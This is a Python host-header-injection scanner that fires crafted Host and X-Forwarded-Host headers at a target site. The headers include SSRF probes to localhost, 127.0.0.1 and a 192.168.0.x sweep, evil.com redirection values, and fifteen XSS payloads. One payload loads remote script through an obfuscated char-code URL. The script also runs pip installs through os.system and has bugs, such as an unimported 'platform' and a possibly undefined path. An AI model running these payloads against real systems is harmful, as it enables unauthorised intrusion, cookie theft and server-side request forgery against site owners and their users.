import sys
from src.request import *
from src.utilities import *
from src.style import *
import time
from urllib.parse import urlparse
import argparse
import os
try:
    import validators
except ModuleNotFoundError:
    if platform=="linux" or platform=="linux2":
        os.system("pip3 install validators")
    elif platform=="win32":
        os.system("pip install validators")
    else:
        print("cannot detect this device")

banner = """

@@@@@@@    @@@@@@   @@@@@@@   @@@@@@@
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@
@@!  @@@  @@!  @@@  @@!  @@@    @@!
!@!  @!@  !@!  @!@  !@!  @!@    !@!
@!@@!@!   @!@  !@!  @!@!!@!     @!!
!!@!!!    !@!  !!!  !!@!@!      !!!
!!:       !!:  !!!  !!: :!!     !!:
:!:       :!:  !:!  :!:  !:!    :!:
 ::       ::::: ::  ::   :::     ::
 :         : :  :    :   : :     :


@@@  @@@  @@@       @@@  @@@@@@@@   @@@@@@@  @@@@@@@  @@@   @@@@@@   @@@  @@@
@@@  @@@@ @@@       @@@  @@@@@@@@  @@@@@@@@  @@@@@@@  @@@  @@@@@@@@  @@@@ @@@
@@!  @@!@!@@@       @@!  @@!       !@@         @@!    @@!  @@!  @@@  @@!@!@@@
!@!  !@!!@!@!       !@!  !@!       !@!         !@!    !@!  !@!  @!@  !@!!@!@!
!!@  @!@ !!@!       !!@  @!!!:!    !@!         @!!    !!@  @!@  !@!  @!@ !!@!
!!!  !@!  !!!       !!!  !!!!!:    !!!         !!!    !!!  !@!  !!!  !@!  !!!
!!:  !!:  !!!       !!:  !!:       :!!         !!:    !!:  !!:  !!!  !!:  !!!
:!:  :!:  !:!  !!:  :!:  :!:       :!:         :!:    :!:  :!:  !:!  :!:  !:!
 ::   ::   ::  ::: : ::   :: ::::   ::: :::     ::     ::  ::::: ::   ::   ::
:    ::    :    : :::    : :: ::    :: :: :     :     :     : :  :   ::    :

"""

print(style.RED + banner + style.RESET + "    A tool made by " + style.RED + "Xnuvers007" + style.RESET + " < https://github.com/Xnuvers007 >\r\n\r\n")
print(style.BLUE + "-d --domain = Domain name to search HOST HEADER INJECTION in root path")
print(style.BLUE + "-c --cookie = Send a custom cookie/s in all the HTTP requests")
print(style.BLUE + "-u --url = URL path to search HOST HEADER INJECTION")
print(style.BLUE + "-p --path = Path to include in the HTTP request")
print(style.BLUE + "-r --range = Send Host headers with a range of local IPs")
print(style.BLUE + "-v --verbose = Show all the HTML returned by the server")
print("\n")
print(style.GREEN + "Usage python3 main.py -u <URL> -v")


PORT = 443

# Parse the arguments
def parse_args():
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -d google.com")
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-d', '--domain', help="Domain name to search HOST HEADER INJECTION in root path", required=False)
    parser.add_argument('-c', '--cookie', help="Send a custom cookie/s in all the HTTP requests", required=False)
    parser.add_argument('-u', '--url', help="URL path to search HOST HEADER INJECTION", required=False)
    parser.add_argument('-p', '--path', help="Path to include in the HTTP request", required=False)
    parser.add_argument('-r', '--range', help="Send Host headers with a range of local IPs", required=False, const=True, nargs='?')
    parser.add_argument('-v', '--verbose', help="Show all the HTML returned by the server", required=False, const=True, nargs='?')
    return parser.parse_args()

# Main function to check the HOST ATTACK
def attack(URL, path, domain, verbose, ips, cookie):
    print(style.GREEN + "[ * ]" + style.RESET + "Connected to " + str(domain) + ":" + str(PORT)+"\r\n")

    # CHECK IP ARRAY
    if len(ips) > 1:
        for ip in ips:
            print(style.YELLOW + "[ * ]"+style.RESET + "TRYING LOCAL IP !")
            get_request(URL, path, 443, verbose, ['Host: ' + ip, "Cookie: " + cookie])

    else:

        print(style.YELLOW + "[ * ]"+style.RESET + "TRYING PORT INJECTION !")
        get_request(URL, path, 443, verbose, ['Host:' + domain + ":22", "Cookie:" + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET + "TRYING PATH !")
        get_request(URL, path,443, verbose, ['Host: '+domain+'@evil.com', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING SSRF !")
        get_request(URL, path, 443, verbose, ['Host: localhost', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING SSRF IP !")
        get_request(URL, path, 443, verbose, ['Host: 127.0.0.1', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING RANDOM HOST !")
        get_request(URL, path, 443, verbose, ['Host: evil.com', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD !")
        get_request(URL, path, 443, verbose, ['Host: ""><s"%2b"cript>alert(document.cookie)</script>"', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 2 !")
        get_request(URL, path, 443, verbose, ['Host: ""><STYLE>@import"javascript:alert(1997)";</STYLE>', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 3 !")
        get_request(URL, path, 443, verbose, ['Host: ""onclick=prompt(8)><svg/onload=prompt(8)>"@x.y', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 4 !")
        get_request(URL, path, 443, verbose, ['Host: ""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 5 !")
        get_request(URL, path, 443, verbose, ['Host: "<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 6 !")
        get_request(URL, path, 443, verbose, ['Host: "<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 7 !")
        get_request(URL, path, 443, verbose, ['Host: "<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 8 !")
        get_request(URL, path, 443, verbose, ['Host: "'';!--"<XSS>=&{()}', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 9 !")
        get_request(URL, path, 443, verbose, ["Host: '&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'", "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 10 !")
        get_request(URL, path, 443, verbose, ['Host: "<ScRiPt>alert(1)</sCriPt>', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 11 !")
        get_request(URL, path, 443, verbose, ['Host: <ScRiPt>alert(1)</sCriPt>', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 12 !")
        get_request(URL, path, 443, verbose, ['Host: "><ImG Src=xx onerror(document.['cookie'];>', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 13 !")
        get_request(URL, path, 443, verbose, ['Host: <script type="text/javascript">alert(1997)</script>', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 14 !")
        get_request(URL, path, 443, verbose, ['Host: <img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 15 !")
        get_request(URL, path, 443, verbose, ['Host: <svg%0Aonauxclick=0;[1].some(confirm)//', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING DOUBLE HOST HEADER INJECTION !")
        get_request(URL, path, 443, verbose, [' Host:'+URL, 'Host: mykingbee.blogspot.com', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING DOUBLE HOST HEADER INJECTION !")
        get_request(URL, path, 443, verbose, [' Host:'+URL, 'Host: evil.com', "Cookie: " + cookie])

        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING X-FORWARDED-HOST INJECTION !")
        get_request(URL, path, 443, verbose, ['Host: '+ domain, 'X-Forwarded-Host: evil.com', "Cookie: " + cookie])

try:
    rawCookies = ""
    args = parse_args()
    isPath = False
    verbose =  False
    ips = []

    # Verbose Mode
    if args.verbose:
        verbose = True
    # Cookies from user input
    if args.cookie:
        rawCookies = args.cookie
    # Check IP Range in Host Header
    if args.range:
        rangeIp = args.range
        ipPattern = "192.168.0."

        for i in range(1, 255):
            ip = ipPattern + str(i)
            ips.append(ip)
    # Specify domain
    if args.domain:
        URL = args.domain
        domain = URL
    # Specify URL
    elif args.url:
        domain = urlparse(args.url).netloc
        path = urlparse(args.url).path + "?" + urlparse(args.url).query
        if path == "":
            path = "/"
        URL = args.url
    # Specify custom path in the URL
    if args.path:
        isPath = True
        path = args.path

    attack(URL, path, domain, verbose, ips, rawCookies)

except Exception as e:
    print(e)
